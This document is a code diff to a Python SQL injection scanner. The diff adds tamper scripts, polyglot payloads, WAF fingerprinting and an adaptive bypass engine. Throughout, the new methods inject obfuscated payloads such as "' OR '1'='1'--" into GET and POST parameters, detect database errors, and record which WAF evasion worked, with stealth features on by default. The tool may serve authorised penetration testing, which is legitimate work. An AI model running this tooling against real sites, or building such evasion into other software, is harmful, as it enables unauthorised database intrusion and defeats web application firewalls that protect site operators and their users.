@@ -26,6 +26,9 @@ from .advanced_payloads import AdvancedPayloadLibrary
 from .false_positive_filter import FalsePositiveFilter
 from .impact_demonstrator import ImpactDemonstrator
 from .stealth_engine import StealthEngine
+from .tamper_scripts import TamperEngine
+from .polyglot_payloads import PolyglotEngine
+from .adaptive_waf_bypass import WAFDetector, AdaptiveBypassEngine
 
 # Configure logging
 logger = logging.getLogger(__name__)
@@ -173,10 +176,18 @@ class SQLInjectionEngine:
         # Initialize stealth engine (NEW)
         self.stealth = StealthEngine(config) if config.get('enable_stealth', True) else None
         
+        # Initialize EXTREMELY ADVANCED modules (NEWEST)
+        self.tamper_engine = TamperEngine()
+        self.polyglot_engine = PolyglotEngine()
+        self.waf_detector = WAFDetector()
+        self.adaptive_bypass = AdaptiveBypassEngine(self.tamper_engine, self.polyglot_engine)
+        
         # Enable features based on config
         self.use_advanced_payloads = config.get('enable_advanced_payloads', True)
         self.use_fp_reduction = config.get('enable_false_positive_reduction', True)
         self.use_impact_demo = config.get('enable_impact_demonstration', True)
+        self.use_adaptive_bypass = config.get('enable_adaptive_bypass', True)
+        self.use_polyglot_payloads = config.get('enable_polyglot_payloads', True)
         
     def _get_headers(self, custom_headers: Optional[Dict] = None) -> Dict:
         """Get request headers with optional randomization."""
@@ -213,12 +224,19 @@ class SQLInjectionEngine:
     
     def _obfuscate_payload(self, payload: str) -> str:
         """
-        Apply basic obfuscation to payload to evade WAF.
+        Apply advanced obfuscation to payload to evade WAF.
+        Now uses the comprehensive tamper script system.
         """
         if not self.config.get('use_payload_obfuscation', False):
             return payload
         
-        # Simple obfuscation techniques
+        # Use adaptive bypass if enabled
+        if self.use_adaptive_bypass:
+            # Apply random tamper script
+            tampered = self.tamper_engine.apply_random_tamper(payload, count=1)
+            return tampered
+        
+        # Fallback to simple obfuscation techniques
         obfuscations = [
             lambda p: p.replace(' ', '/**/'),  # Replace spaces with comments
             lambda p: p.replace('OR', 'OR/**/'),  # Add comments
@@ -232,6 +250,124 @@ class SQLInjectionEngine:
             return obfuscation(payload)
         
         return payload
+    
+    def _get_adaptive_bypass_payloads(self, original_payload: str, 
+                                      baseline_response=None,
+                                      max_variations: int = 10) -> List[str]:
+        """
+        Get adaptive bypass payload variations based on WAF detection.
+        This is the EXTREMELY ADVANCED feature that adapts to WAF behavior.
+        
+        Args:
+            original_payload: Original SQL injection payload
+            baseline_response: Baseline response for WAF detection
+            max_variations: Maximum number of variations to generate
+        
+        Returns:
+            List of bypass payload variations
+        """
+        if not self.use_adaptive_bypass:
+            return [original_payload]
+        
+        # Detect WAF from baseline response
+        detected_waf, confidence = self.waf_detector.detect_waf(baseline_response) if baseline_response else (None, 0.0)
+        
+        if detected_waf and confidence > 0.5:
+            logger.info(f"WAF detected: {detected_waf} (confidence: {confidence:.2f})")
+        
+        # Get adaptive bypass payloads
+        bypass_payloads = self.adaptive_bypass.get_bypass_payloads(
+            original_payload, 
+            detected_waf=detected_waf,
+            max_variations=max_variations
+        )
+        
+        # Add polyglot payloads if enabled
+        if self.use_polyglot_payloads:
+            # Get context-agnostic polyglots
+            polyglots = self.polyglot_engine.get_context_agnostic()[:3]
+            bypass_payloads.extend(polyglots)
+        
+        return bypass_payloads[:max_variations]
+    
+    def _test_with_adaptive_bypass(self, url: str, method: str,
+                                   param_name: str, param_value: str,
+                                   param_type: str,
+                                   params: Optional[Dict] = None,
+                                   data: Optional[Dict] = None,
+                                   cookies: Optional[Dict] = None,
+                                   headers: Optional[Dict] = None,
+                                   baseline_response=None) -> Optional[Dict]:
+        """
+        Test parameter with adaptive WAF bypass techniques.
+        This uses tamper scripts, polyglot payloads, and WAF-specific bypasses.
+        
+        Returns:
+            Finding dict if vulnerability detected, None otherwise
+        """
+        if not self.use_adaptive_bypass:
+            return None
+        
+        # Start with basic test payload
+        test_payloads = ["' OR '1'='1'--", "' AND '1'='1'--"]
+        
+        # Generate adaptive bypass variations
+        bypass_variations = []
+        for base_payload in test_payloads[:1]:  # Use first payload for variations
+            variations = self._get_adaptive_bypass_payloads(
+                base_payload,
+                baseline_response=baseline_response,
+                max_variations=5
+            )
+            bypass_variations.extend(variations)
+        
+        logger.info(f"Testing {param_name} with {len(bypass_variations)} adaptive bypass variations")
+        
+        # Test each variation
+        for payload in bypass_variations:
+            # Prepare request
+            if param_type == 'GET':
+                test_params = params.copy() if params else {}
+                test_params[param_name] = str(param_value) + payload
+                response = self._make_request(url, method, test_params, data, cookies, headers)
+            elif param_type == 'POST':
+                test_data = data.copy() if data else {}
+                test_data[param_name] = str(param_value) + payload
+                response = self._make_request(url, method, params, test_data, cookies, headers)
+            else:
+                continue
+            
+            if not response:
+                continue
+            
+            # Check for SQL errors
+            error_pattern = self._check_sql_errors(response)
+            if error_pattern:
+                # Check if response indicates WAF bypass
+                is_waf_blocked = self.waf_detector.is_waf_response(response, baseline_response)
+                
+                if not is_waf_blocked:
+                    # Success! Record this bypass technique
+                    detected_waf, _ = self.waf_detector.detect_waf(baseline_response) if baseline_response else (None, 0.0)
+                    if detected_waf:
+                        self.adaptive_bypass.record_success(detected_waf, 'adaptive', payload)
+                    
+                    logger.info(f"Adaptive bypass successful with payload: {payload[:50]}...")
+                    
+                    # Return finding
+                    db_type = self._detect_database_type(response.text)
+                    return {
+                        'injection_type': 'error_based_adaptive',
+                        'vulnerable_parameter': param_name,
+                        'parameter_type': param_type,
+                        'test_payload': payload,
+                        'detection_evidence': f'SQL error pattern matched with adaptive bypass: {error_pattern}',
+                        'database_type': db_type or 'unknown',
+                        'bypass_technique': 'adaptive_waf_bypass',
+                        'response': response,
+                    }
+        
+        return None
     
     def _make_request(self, url: str, method: str = 'GET', 
                      params: Optional[Dict] = None,
@@ -448,6 +584,19 @@ class SQLInjectionEngine:
                     if confidence >= 0.5:
                         findings.append(finding)
                         logger.info(f"Confirmed SQL injection in {param_name} (confidence: {confidence:.2f})")
+                
+                # If no findings with normal payloads, try adaptive bypass
+                if not param_findings and self.use_adaptive_bypass:
+                    logger.info(f"Trying adaptive WAF bypass for parameter: {param_name}")
+                    adaptive_finding = self._test_with_adaptive_bypass(
+                        url, method, param_name, param_value, 'GET',
+                        params, data, cookies, headers, baseline_response
+                    )
+                    if adaptive_finding:
+                        adaptive_finding['confidence_score'] = 0.85  # High confidence for successful bypass
+                        adaptive_finding.pop('response', None)
+                        findings.append(adaptive_finding)
+                        logger.info(f"✓ Adaptive bypass successful for {param_name}")
         
         # Test POST parameters (similar logic)
         if data and method.upper() == 'POST':
@@ -505,6 +654,19 @@ class SQLInjectionEngine:
                     
                     if confidence >= 0.5:
                         findings.append(finding)
+                
+                # If no findings with normal payloads, try adaptive bypass
+                if not param_findings and self.use_adaptive_bypass:
+                    logger.info(f"Trying adaptive WAF bypass for POST parameter: {param_name}")
+                    adaptive_finding = self._test_with_adaptive_bypass(
+                        url, method, param_name, param_value, 'POST',
+                        params, data, cookies, headers, baseline_response
+                    )
+                    if adaptive_finding:
+                        adaptive_finding['confidence_score'] = 0.85  # High confidence for successful bypass
+                        adaptive_finding.pop('response', None)
+                        findings.append(adaptive_finding)
+                        logger.info(f"✓ Adaptive bypass successful for {param_name}")
         
         return findings
     
